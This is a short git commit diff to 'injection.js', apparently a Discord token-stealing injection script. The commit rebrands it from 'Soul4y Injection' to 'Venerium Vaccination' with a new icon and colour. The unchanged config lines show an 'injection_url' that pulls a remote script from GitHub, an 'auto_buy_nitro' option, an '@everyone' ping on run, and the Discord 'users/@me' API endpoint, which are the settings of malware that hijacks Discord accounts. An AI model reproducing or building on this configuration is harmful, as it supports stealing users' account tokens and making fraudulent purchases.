7314067a27d08f28f551c67423cd59caa3a12543
beztpro9 <ultaguy542@gmail.com>
2024-08-16 11:10:09 +0600

    Update injection.js

--- injection.js
+++ injection.js
@@ -12,9 +12,9 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'Soul4y Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/beztpro9/Imagecode/main/Capture.png',
-  embed_color: 5639644, 
+  embed_name: 'Venerium Vaccination', 
+  embed_icon: 'https://raw.githubusercontent.com/vilished/image-src/main/175107031.jpeg',
+  embed_color: 0x7289DA, 
   injection_url: 'https://raw.githubusercontent.com/beztpro9/-/main/Url.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
